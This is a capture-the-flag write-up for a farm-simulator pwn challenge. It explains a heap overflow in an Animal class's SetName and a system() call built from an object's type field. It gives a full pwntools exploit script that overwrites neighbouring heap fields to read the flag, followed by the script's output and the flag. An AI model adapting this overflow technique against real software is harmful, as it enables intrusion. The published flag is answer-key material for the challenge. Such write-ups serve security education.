---
grand_parent: Categories
parent: Pwn
title: Object Oriented Pwning
nav_order: 1
---

# Object Oriented Pwning
```
I've been working on a new Farm Simulator game, try it out! I just wish I knew what these animals were saying...
```

## Challenge

> TL;DR: Exploit heap overflow. Buy two pigs, overflow to modify the max_age (so that you can sell for more money), sell the second pig, repeat the process until the balance is > 1300, feed the first pig, overflow to modify the animal type to "flag", buy translator and lastly translate.

Running the program:
``` bash
$ ./oop
Welcome to your new farm
Your current balance is 500
1) List Animals
2) Act on Animal
3) Buy New Animal
4) Buy translator (1000c)
5) Sell The Farm
> 
```

The binary comprises of 5 functionalities:
- `List Animals` - Display information about your owned animals
- `Act on Animal` - Allows you to feed the animal (50c), sell the animal, rename the name of the animal (100c) and translate what the animal is saying (Requires translator)
- `Buy New Animal` - Allows you to buy either pig (150c) or cow (250c)
- `Buy translator` - ALlows you to buy a translator
- `Sell The Farm` - Exit the program

We know that we can leak the content of the `flag.txt` using the "translate" functionality if `this->type` contains the "flag" string.

Source code of `Translate()`
``` c++
void Animal::Translate() {
    char buf[1024];
    sprintf(buf, "/usr/games/cowsay -f ./%s.txt 'Feed me!'", this->type);
    system(buf);
}
```

After analysing the binary, we found that the binary's `set_name()` is vulnerable to heap overflow. 

Source code of `SetName()`
```c++
void Animal::SetName() {
    printf("What will you name your new animal? ");
    flush();
    unsigned char c;
    int read = 0;
    while ((c = getchar()) != '\n' && read < 64) {
        this->name[read] = c;
        read++;
    }
}
```

Snippet of `Animal.h`
``` c++
class Animal {
public:
    virtual void Age();
    virtual void PrintInfo();
    virtual int Sell() = 0;
    void Translate();
    void SetName();
    virtual ~Animal() = default;
    char type[16];
    bool dead = false;
    uint8_t max_age;
    uint8_t hunger = 0;
protected:
    uint8_t age = 1;
    char name[16];
};
```

The name of the animal has a size of 16 bytes but we can provide up to 63 bytes in `SetName()`. This shows that we can overflow the array. So, we can overwrite the data of the animal that is allocated after this animal. (HEHE! :sunglasses:)

From our dynamic analysis of the program, the offset between the memory allocated to 2 animals is 20 bytes. We need to leak the content of these 20 bytes (Using random value will result in crash).

``` bash
-snip-
gef➤  x/b 0x4182dc+0x23
0x4182ff:	0x0
gef➤  x/b 0x4182dc+0x24
0x418300:	0x78
-snip-
```

Idea of exploit: Buy two pigs, overflow to modify the max_age of the second pig (so that you can sell for more money), sell the second pig, feed the first pig if we have sufficient money. Repeat this process until the balance is > 1300, feed the first pig, overflow to modify the second pig's type to "flag", buy a translator and lastly translate what the second pig is saying.

POC: (Note: This script will fail if the first pig dies. So, it requires a bit of luck and multiple retries):
``` python
from pwn import *

def feed():
    log.info("Feeding animal[0]")
    r.sendline(b'2')
    r.recvuntil(b'animal? ')
    r.sendline(b'0')
    r.recvuntil(b'> ')
    r.sendline(b'2')

def buy_first_animal():
    r.sendline(b'3')
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'animal? ')
    r.sendline(b'pig')

def buy_sec_animal():
    r.sendline(b'3')
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'animal? ')
    r.sendline(b'pig2')

def check_price():
    line = r.recvuntil(b'balance is ')
    if "died" in line.decode():
        print("animal ded")
    price = int(r.recvuntil(b'\n').strip())
    print(r.recvuntil(b'> '))
    return price

def change_max_age():
    r.sendline(b'2')
    r.recvuntil(b'animal? ')
    r.sendline(b'0')
    r.recvuntil(b'> ')
    r.sendline(b'3')
    r.recvuntil(b'animal? ')
    payload = b'A'*16 + b'\x00' * 12 + b'\x41' + b'\x00' * 7 + b'\x78\x4d\x40\x00\x00\x00\x00\x00\x70\x69\x67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00'
    #print(len(payload))
    r.sendline(payload)

def sell_animal():
    r.sendline(b'2')
    r.recvuntil(b'animal? ')
    r.sendline(b'1')
    r.recvuntil(b'> ')
    r.sendline(b'1')

binary = ELF('./oop')
#r = process('./oop')
r = remote('193.57.159.27', 62750)

# Gain money   
r.recvuntil(b'> ')
buy_first_animal()

while True:
    price = check_price()
    print("Balance: " + str(price))
    if price > 1350:
        break
    if price > 800:
        feed()

    # needs 150c
    log.info("Buying pig")
    buy_sec_animal()

    price = check_price()
    print("Balance: " + str(price))
    #if price > 350:
    #    feed()
    
    # needs 100c
    log.info("Changing max age of animal[1]")
    change_max_age()
    
    price = check_price()
    print("Balance: " + str(price))
    #if price > 350:
    #    feed()

    # no money is needed
    log.info("Selling animal[1]")
    sell_animal()
    
feed() 

price = check_price()
print("Balance: " + str(price))

log.info("Buying pig")
buy_sec_animal()

log.info("rename the type")
r.recvuntil(b'> ')
r.sendline(b'2')
r.recvuntil(b'animal? ')
r.sendline(b'0')
r.recvuntil(b'> ')
r.sendline(b'3')
r.recvuntil(b'animal? ')
payload = b'A'*16 + b'\x00' * 12 + b'\x41' + b'\x00' * 7 + b'\x78\x4d\x40\x00\x00\x00\x00\x00\x66\x6c\x61\x67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00'
r.sendline(payload)

log.info("buy translator")
r.recvuntil(b'> ')
r.sendline(b'4')

log.info("translate")
r.recvuntil(b'> ')
r.sendline(b'2')
r.recvuntil(b'animal? ')
r.sendline(b'1')
r.recvuntil(b'> ')
r.sendline(b'4')

r.interactive()
```

Output of the script:
``` bash
$ python3 pwn6.py
[*] '/home/kali/Downloads/rarctf/OOP/oop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 193.57.159.27 on port 62750: Done
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 350
[*] Buying pig
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 200
[*] Changing max age of animal[1]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 100
[*] Selling animal[1]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 850
[*] Feeding animal[0]
[*] Buying pig
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 650
[*] Changing max age of animal[1]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 550
[*] Selling animal[1]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 1300
[*] Feeding animal[0]
[*] Buying pig
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 1100
[*] Changing max age of animal[1]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 1000
[*] Selling animal[1]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 1000
[*] Feeding animal[0]
[*] Buying pig
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 800
[*] Changing max age of animal[1]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 700
[*] Selling animal[1]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 1450
[*] Feeding animal[0]
b'1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> '
Balance: 1400
[*] Buying pig
[*] rename the type
[*] buy translator
[*] translate
[*] Switching to interactive mode
 __________
< Feed me! >
 ----------
  \
    \
rarctf{C0w_s4y_m00_p1g_s4y_01nk_fl4g_s4y-251e363a}
Unknown option
Your current balance is 150
1) List Animals
2) Act on Animal
3) Buy New Animal
4) Buy translator (1000c)
5) Sell The Farm
> $  
```

Flag: `rarctf{C0w_s4y_m00_p1g_s4y_01nk_fl4g_s4y-251e363a}`